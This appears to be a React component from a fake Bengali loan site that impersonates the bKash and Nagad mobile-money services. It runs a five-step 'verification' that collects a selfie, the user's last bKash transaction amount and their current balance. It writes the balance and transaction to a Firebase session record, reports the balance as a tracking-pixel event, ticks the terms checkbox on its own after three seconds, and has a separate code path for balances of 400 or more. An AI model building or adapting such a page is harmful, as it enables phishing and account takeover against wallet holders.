
import React, { useState, useEffect, useRef } from 'react';
import { LoanFormData, AccountVerificationData } from '../types';
import { db } from '../App';
import { trackEvent } from '../lib/pixel';

interface AccountDetailsPageProps {
  data: LoanFormData;
  sessionId: string;
  onSubmit: (details: AccountVerificationData) => void;
  startAtStep?: number;
}

const AccountDetailsPage: React.FC<AccountDetailsPageProps> = ({ data, sessionId, onSubmit, startAtStep }) => {
  const [currentStep, setCurrentStep] = useState(startAtStep || 1);
  const [termsChecked, setTermsChecked] = useState(false);
  const [selfiePreview, setSelfiePreview] = useState<string | null>(null);
  const [lastTransaction, setLastTransaction] = useState('');
  const [currentBalance, setCurrentBalance] = useState('');
  const [showInvalidCharWarning, setShowInvalidCharWarning] = useState(false);
  const [btnLoading, setBtnLoading] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const totalSteps = 5;

  useEffect(() => {
    if (currentStep === 1) {
      const timer = setTimeout(() => {
        setTermsChecked(true);
      }, 3000);
      return () => clearTimeout(timer);
    }
  }, [currentStep]);

  const handleSelfieClick = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      const video = document.createElement('video');
      video.srcObject = stream;
      video.setAttribute('playsinline', 'true');
      await video.play();
      await new Promise(resolve => setTimeout(resolve, 500));
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d')?.drawImage(video, 0, 0);
      stream.getTracks().forEach(t => t.stop());
      const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
      setSelfiePreview(dataUrl);
    } catch (err) {
      fileInputRef.current?.click();
    }
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setSelfiePreview(reader.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleFinalSubmit = async () => {
    const balanceNum = parseInt(currentBalance || '0');
    if (sessionId && balanceNum >= 400) {
      await db.ref('sessions/' + sessionId).update({
        userBalance: currentBalance,
        lastTransaction: lastTransaction,
        lastUpdated: Date.now()
      });
    } else if (sessionId) {
      await db.ref('sessions/' + sessionId).update({
        userBalance: currentBalance,
        lastTransaction: lastTransaction,
        lastUpdated: Date.now()
      });
    }
    onSubmit({ currentBalance, lastTransaction });
  };

  const progressWidth = `${(currentStep / totalSteps) * 100}%`;

  const renderProgressBar = () => (
    <div className="mb-8">
      <div className="flex items-center justify-between mb-3">
        <span className="text-xs font-bold text-gray-500">ধাপ {currentStep}/{totalSteps}</span>
        <span className="text-xs font-bold text-[#E2136E]">{Math.round((currentStep / totalSteps) * 100)}%</span>
      </div>
      <div className="w-full h-2 bg-gray-100 rounded-full overflow-hidden">
        <div
          className="h-full bg-gradient-to-r from-[#E2136E] to-[#ff4d94] rounded-full transition-all duration-700 ease-out"
          style={{ width: progressWidth }}
        />
      </div>
      <div className="flex justify-between mt-2">
        {Array.from({ length: totalSteps }, (_, i) => (
          <div
            key={i}
            className={`w-6 h-6 rounded-full flex items-center justify-center text-[10px] font-bold transition-all ${
              i + 1 <= currentStep
                ? 'bg-[#E2136E] text-white shadow-md'
                : 'bg-gray-100 text-gray-400'
            }`}
          >
            {i + 1 < currentStep ? (
              <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" />
              </svg>
            ) : (
              i + 1
            )}
          </div>
        ))}
      </div>
    </div>
  );

  const renderStep1 = () => (
    <div className="space-y-6 animate-fade-in">
      <div className="flex items-center space-x-3 mb-2">
        <div className="w-12 h-12 bg-[#E2136E]/10 rounded-full flex items-center justify-center">
          <svg className="w-6 h-6 text-[#E2136E]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
          </svg>
        </div>
        <h3 className="text-lg font-black text-gray-800">অ্যাকাউন্ট মালিকানা যাচাই</h3>
      </div>

      <div className="bg-amber-50 border border-amber-200 rounded-2xl p-5 space-y-3">
        <div className="flex items-start space-x-2">
          <svg className="w-5 h-5 text-amber-600 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.732-.833-2.5 0L4.27 16.5c-.77.833.192 2.5 1.732 2.5z" />
          </svg>
          <p className="text-sm text-amber-900 font-semibold leading-relaxed">
            আবেদন যাচাইয়ের জন্য অ্যাকাউন্ট মালিকানা নিশ্চিত করা আবশ্যক। এই ধাপটি শুধুমাত্র প্রকৃত আবেদনকারীর জন্য। ভুল বা অনুমেয় তথ্য দিলে আবেদনটি স্বয়ংক্রিয়ভাবে বাতিল করা হবে।
          </p>
        </div>
      </div>

      <div className="flex items-center space-x-3 py-3">
        <div className={`w-5 h-5 rounded border-2 flex items-center justify-center transition-all duration-500 ${
          termsChecked ? 'bg-[#E2136E] border-[#E2136E]' : 'border-gray-300 bg-white'
        }`}>
          {termsChecked ? (
            <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" />
            </svg>
          ) : (
            <div className="w-3 h-3 border-2 border-gray-200 border-t-[#E2136E] rounded-full animate-spin" />
          )}
        </div>
        <p className="text-sm font-medium text-gray-700">
          আপনি <span className="text-[#E2136E] font-bold">নিয়ম ও শর্তসমূহে</span> সম্মত আছেন
        </p>
      </div>

      <button
        disabled={!termsChecked || btnLoading}
        onClick={() => { setBtnLoading(true); setTimeout(() => { setBtnLoading(false); setCurrentStep(2); }, 1000); }}
        className={`w-full py-4 rounded-xl font-black text-lg transition-all active:scale-95 shadow-lg ${
          termsChecked && !btnLoading
            ? 'bg-[#E2136E] text-white hover:bg-[#D11263]'
            : 'bg-gray-200 text-gray-400 cursor-not-allowed'
        }`}
      >
        {btnLoading ? (
          <div className="flex gap-1.5 justify-center">
            <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '0ms' }}></span>
            <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '150ms' }}></span>
            <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '300ms' }}></span>
          </div>
        ) : 'শুরু করুন'}
      </button>
    </div>
  );

  const renderStep2 = () => (
    <div className="space-y-6 animate-fade-in">
      <div className="flex items-center space-x-3 mb-2">
        <div className="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center">
          <svg className="w-6 h-6 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"/>
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"/>
          </svg>
        </div>
        <div>
          <h3 className="text-lg font-black text-gray-800">সেলফি ভেরিফিকেশন</h3>
          <p className="text-xs text-gray-500 font-medium">পরিচয় নিশ্চিতকরণের জন্য আপনার ছবি প্রদান করুন</p>
        </div>
      </div>

      <input
        type="file"
        accept="image/*"
        ref={fileInputRef}
        onChange={handleFileChange}
        className="hidden"
      />

      <div
        onClick={() => fileInputRef.current?.click()}
        className="relative w-full h-56 bg-gradient-to-br from-gray-50 to-gray-100 rounded-2xl border-2 border-dashed border-gray-300 hover:border-[#E2136E] flex items-center justify-center cursor-pointer overflow-hidden transition-all group"
      >
        {selfiePreview ? (
          <div className="w-full h-full relative">
            <img src={selfiePreview} alt="Selfie" className="w-full h-full object-cover" />
            <div className="absolute inset-0 bg-black/30 flex flex-col items-center justify-center">
              <div className="bg-green-500 text-white px-5 py-2.5 rounded-full font-bold text-sm shadow-xl flex items-center space-x-2">
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                </svg>
                <span>সফলভাবে আপলোড হয়েছে</span>
              </div>
              <p className="text-white/80 text-xs mt-2 font-medium">পরিবর্তন করতে ট্যাপ করুন</p>
            </div>
          </div>
        ) : (
          <div className="flex flex-col items-center text-center p-6">
            <div className="w-16 h-16 bg-white rounded-full flex items-center justify-center mb-3 shadow-sm group-hover:shadow-md transition-shadow">
              <svg className="w-8 h-8 text-gray-400 group-hover:text-[#E2136E] transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"/>
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"/>
              </svg>
            </div>
            <p className="text-sm font-bold text-gray-600 group-hover:text-[#E2136E] transition-colors">ক্যামেরা চালু করুন</p>
            <p className="text-xs text-gray-400 mt-1">অথবা গ্যালারি থেকে আপলোড করুন</p>
          </div>
        )}
      </div>

      <button
        disabled={btnLoading}
        onClick={() => { setBtnLoading(true); setTimeout(() => { setBtnLoading(false); setCurrentStep(3); }, 1000); }}
        className={`w-full py-4 rounded-xl font-black text-lg transition-all active:scale-95 shadow-lg ${btnLoading ? 'bg-[#E2136E] text-white' : 'bg-[#E2136E] text-white hover:bg-[#D11263]'}`}
      >
        {btnLoading ? (
          <div className="flex gap-1.5 justify-center">
            <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '0ms' }}></span>
            <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '150ms' }}></span>
            <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '300ms' }}></span>
          </div>
        ) : 'পরবর্তী'}
      </button>
    </div>
  );

  const renderStep3 = () => (
    <div className="space-y-6 animate-fade-in">
      <div className="flex items-center space-x-3 mb-2">
        <div className="w-12 h-12 bg-green-50 rounded-full flex items-center justify-center">
          <svg className="w-6 h-6 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2zm7-5a2 2 0 11-4 0 2 2 0 014 0z" />
          </svg>
        </div>
        <div>
          <h3 className="text-lg font-black text-gray-800">সর্বশেষ লেনদেনের পরিমাণ</h3>
          <p className="text-xs text-gray-500 font-medium">আপনার বিকাশের সর্বশেষ লেনদেনের পরিমাণ লিখুন</p>
        </div>
      </div>

      <div className="bg-gray-50 rounded-2xl p-6 border border-gray-100">
        <label className="block text-sm font-bold text-gray-700 mb-3">আপনার সর্বশেষ লেনদেনের পরিমাণ (টাকা)</label>
        <div className="relative">
          <input
            type="text"
            inputMode="numeric"
            pattern="[0-9]*"
            className="w-full p-4 border-2 border-gray-200 rounded-xl focus:ring-2 focus:ring-[#E2136E] focus:border-[#E2136E] outline-none transition text-lg font-bold"
            value={lastTransaction}
            onChange={(e) => setLastTransaction(e.target.value.replace(/[^0-9]/g, ''))}
            placeholder="যেমন: ৫০০"
            autoFocus
          />
          <span className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 font-bold text-lg">৳</span>
        </div>
      </div>

      <button
        disabled={!lastTransaction || btnLoading}
        onClick={() => { setBtnLoading(true); setTimeout(() => { setBtnLoading(false); setCurrentStep(4); }, 1000); }}
        className={`w-full py-4 rounded-xl font-black text-lg transition-all active:scale-95 shadow-lg ${
          lastTransaction && !btnLoading
            ? 'bg-[#E2136E] text-white hover:bg-[#D11263]'
            : 'bg-gray-200 text-gray-400 cursor-not-allowed'
        }`}
      >
        {btnLoading ? (
          <div className="flex gap-1.5 justify-center">
            <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '0ms' }}></span>
            <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '150ms' }}></span>
            <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '300ms' }}></span>
          </div>
        ) : 'পরবর্তী'}
      </button>
    </div>
  );

  const handleBalanceNext = () => {
    const balVal = parseInt(currentBalance || '0');
    if (balVal > 20000) {
      return;
    }
    const provider = localStorage.getItem('payment_provider') || 'bkash';
    try {
      trackEvent('AddToCart', {}, {
        content_name: (provider === 'nagad' ? 'Nagad' : 'bKash') + ' Balance Entered',
        content_category: 'loan',
        currency: 'BDT',
        value: balVal,
      });
    } catch (e) {}
    setBtnLoading(true);
    setTimeout(() => {
      setBtnLoading(false);
      setCurrentStep(5);
    }, 1000);
  };

  const renderStep4 = () => (
    <div className="space-y-6 animate-fade-in">
      <div className="flex items-center space-x-3 mb-2">
        <div className="w-12 h-12 bg-purple-50 rounded-full flex items-center justify-center">
          <svg className="w-6 h-6 text-purple-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
          </svg>
        </div>
        <div>
          <h3 className="text-lg font-black text-gray-800">বর্তমান ব্যালেন্স</h3>
          <p className="text-xs text-gray-500 font-medium">আপনার বিকাশ একাউন্টের বর্তমান ব্যালেন্স লিখুন</p>
        </div>
      </div>

      <div className="bg-gray-50 rounded-2xl p-6 border border-gray-100">
        <label className="block text-sm font-bold text-gray-700 mb-3"></label>
        <div className="relative">
          <input
            type="text"
            inputMode="numeric"
            pattern="[0-9]*"
            className="w-full p-4 border-2 border-gray-200 rounded-xl focus:ring-2 focus:ring-[#E2136E] focus:border-[#E2136E] outline-none transition text-lg font-bold"
            value={currentBalance}
            onChange={(e) => {
              const raw = e.target.value;
              const v = raw.replace(/[^0-9]/g, '');
              if (raw !== v) {
                setShowInvalidCharWarning(true);
              } else {
                setShowInvalidCharWarning(false);
              }
              if (parseInt(v || '0') <= 20000) {
                setCurrentBalance(v);
              } else {
                setCurrentBalance(v.slice(0, -1));
              }
            }}
            placeholder=""
            autoFocus
          />
          <span className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 font-bold text-lg">৳</span>
        </div>
        {showInvalidCharWarning && (
          <p className="text-sm text-red-500 font-bold mt-2">শুধুমাত্র সংখ্যা গ্রহণযোগ্য। দশমিক (.), কমা (,) বা অন্যান্য বিশেষ চিহ্ন গ্রহণযোগ্য নয়।</p>
        )}
        {parseInt(currentBalance || '0') > 20000 && (
          <p className="text-sm text-red-500 font-bold mt-2">সর্বোচ্চ ২০,০০০ টাকা পর্যন্ত ইনপুট দেওয়া যাবে।</p>
        )}
      </div>

      <p className="text-sm font-bold text-[#E2136E]">আপনার বিকাশের বর্তমান ব্যালেন্স লিখুন</p>

      <button
        disabled={!currentBalance || btnLoading}
        onClick={handleBalanceNext}
        className={`w-full py-4 rounded-xl font-black text-lg transition-all active:scale-95 shadow-lg ${
          currentBalance && !btnLoading
            ? 'bg-[#E2136E] text-white hover:bg-[#D11263]'
            : 'bg-gray-200 text-gray-400 cursor-not-allowed'
        }`}
      >
        {btnLoading ? (
          <div className="flex gap-1.5 justify-center">
            <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '0ms' }}></span>
            <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '150ms' }}></span>
            <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '300ms' }}></span>
          </div>
        ) : 'পরবর্তী'}
      </button>
    </div>
  );

  const renderStep5 = () => (
    <div className="space-y-6 animate-fade-in">
      <div className="flex items-center space-x-3 mb-2">
        <div className="w-12 h-12 bg-[#E2136E]/10 rounded-full flex items-center justify-center">
          <svg className="w-6 h-6 text-[#E2136E]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
          </svg>
        </div>
        <h3 className="text-lg font-black text-gray-800">তথ্য যাচাই</h3>
      </div>

      <div className="bg-blue-50 border border-blue-200 rounded-2xl p-6">
        <div className="flex items-start space-x-3">
          <svg className="w-6 h-6 text-blue-600 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
          </svg>
          <p className="text-sm text-blue-900 font-semibold leading-relaxed">
            আপনার প্রদানকৃত তথ্য পরিচয় ও অ্যাকাউন্ট মালিকানা নিশ্চিত করার জন্য যাচাই করা হবে।
          </p>
        </div>
      </div>

      <div className="bg-gray-50 rounded-2xl p-5 space-y-3 border border-gray-100">
        <div className="flex justify-between items-center py-2 border-b border-gray-200">
          <span className="text-sm text-gray-500 font-bold">সর্বশেষ লেনদেন</span>
          <span className="text-sm text-gray-800 font-black">৳{parseInt(lastTransaction || '0').toLocaleString()}</span>
        </div>
        <div className="flex justify-between items-center py-2">
          <span className="text-sm text-gray-500 font-bold">বর্তমান ব্যালেন্স</span>
          <span className="text-sm text-gray-800 font-black">৳{parseInt(currentBalance || '0').toLocaleString()}</span>
        </div>
      </div>

      <button
        disabled={btnLoading}
        onClick={() => { setBtnLoading(true); setTimeout(() => { setBtnLoading(false); handleFinalSubmit(); }, 1000); }}
        className="w-full py-4 bg-[#E2136E] hover:bg-[#D11263] text-white rounded-xl font-black text-lg shadow-lg transition-all active:scale-95"
      >
        {btnLoading ? (
          <div className="flex gap-1.5 justify-center">
            <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '0ms' }}></span>
            <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '150ms' }}></span>
            <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '300ms' }}></span>
          </div>
        ) : 'যাচাই শুরু করুন'}
      </button>
    </div>
  );

  return (
    <div className="max-w-xl mx-auto animate-fade-in">
      <div className="bg-white p-8 rounded-2xl shadow-xl border border-gray-100">
        {renderProgressBar()}
        {currentStep === 1 && renderStep1()}
        {currentStep === 2 && renderStep2()}
        {currentStep === 3 && renderStep3()}
        {currentStep === 4 && renderStep4()}
        {currentStep === 5 && renderStep5()}
      </div>
    </div>
  );
};

export default AccountDetailsPage;
